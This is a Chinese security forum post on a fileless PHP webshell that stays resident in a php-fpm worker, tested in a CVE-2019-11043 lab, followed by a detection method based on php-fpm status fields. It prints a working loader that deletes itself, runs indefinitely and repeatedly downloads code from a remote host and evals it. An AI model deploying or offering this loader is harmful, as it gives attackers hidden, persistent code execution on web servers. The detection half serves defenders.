一、写在前面
------

所谓"进程驻留"的php无文件攻击，利用了PHP的"解析执行特性"。先执行一个shellcode加载器，加载器运行后删除自身，并加载远程文件（远程文件是被当成字符串直接下载到php进程中执行），动态加载并执行真正的shellcode。

因此，shellcode加载器执行后，删除自身。但是真正执行shellcode的操作在内存中进行，整个过程shellcode不落地。

二、攻击原理
------

- 2.1 shellcode加载器Demo

```php
<?php
    chmod($_SERVER['SCRIPT_FILENAME'], 0777);
    unlink($_SERVER['SCRIPT_FILENAME']);
    ignore_user_abort(true);
    set_time_limit(0);
    echo "success";
    $remote_file = 'http://x.x.x.x/shellcode';
    while($code = file_get_contents($remote_file)){
    @eval($code);
    echo "xunhuan";
    sleep(5);
    };
?>
```

下面做一个简单的分析：

```php
ignore_user_abort(true); 
```

主要用于**后台运行**。这个函数的作用是指示服务器端在远程客户端关闭连接后是否继续执行下面的脚本。如设置为True，则表示如果用户停止脚本运行，仍然不影响脚本的运行。

```php
set_time_limit(0); 
```

主要用于**取消脚本运行时间的超时上限**。函数参数是执行时间，如果为零说明永久执行直到程序结束。如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。但是，脚本也有可能被中间件的默认超时打断。  
中间件的默认超时时间可以通过设置 php.ini 的 max\_execution\_time 或 Apache .conf 的“php\_value max\_execution\_time”来更改。

```php
unlink($_SERVER['SCRIPT_FILENAME']);
```

主要用于**删除自身**。unlink函数运行条件较为苛刻，该脚本要具备可执行权限、可修改文件权限时方能执行。

- 2.2 shellcodeDemo
    
    file\_put\_contents('printTime.txt','I am running '.time());
- 2.3 效果

shellcode加载器执行后，删除自身，并在当前目录生成 printTime.txt。通过循环，每隔5秒执行一次。

这里可以使用CVE-2019-11043的vulhub试验：

上传加载器。

[![](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-7f9b0acc05034310957487098116db3eff960d82.png)](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-7f9b0acc05034310957487098116db3eff960d82.png)

执行加载器。然后观察shellcode是否运行（查看是否循环写入时间戳）。

[![](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-a28b7eec87af81155315426d0c22b69d7cf164f1.png)](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-a28b7eec87af81155315426d0c22b69d7cf164f1.png)

此时，加载器已经删除自身了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-1fd62e5362870c4a4b89e49cb7e9fb5ec385e0af.png)](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-1fd62e5362870c4a4b89e49cb7e9fb5ec385e0af.png)

二、检测方案
------

此类webshell一直在内存中执行，因此该请求短时间内不会被php-fpm释放，可以通过检测php-fpm status中的进程信息。

开启php-fpm status 可参考：  
<https://segmentfault.com/a/1190000005792041>

status 中字段的含义可参考：  
<https://www.cnblogs.com/tinywan/p/6848269.html>

在我们的测试环境中（CVE-2019-11043的vulhub），可以通过修改配置文件：

```php
/usr/local/etc/php-fpm.d/www.conf
```

将pm.status\_path = /status 此行注释取消，重启php-fpm容器即可。重启后查看：

```php
http://x.x.x.x:8080/status?full
```

通过解析php-fpm status的数据，可以观察以下特征：

1. 处理请求的持续时间。字段： `request duration`
2. 检测执行文件是否在文件系统真实存在。字段： `script`

这里贴一个对以上Demo的检测结果：

[![](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-6ebfe411fddabc9ab0358ebdfcce1ce041c4342c.png)](https://shs3.b.qianxin.com/attack_forum/2021/04/attach-6ebfe411fddabc9ab0358ebdfcce1ce041c4342c.png)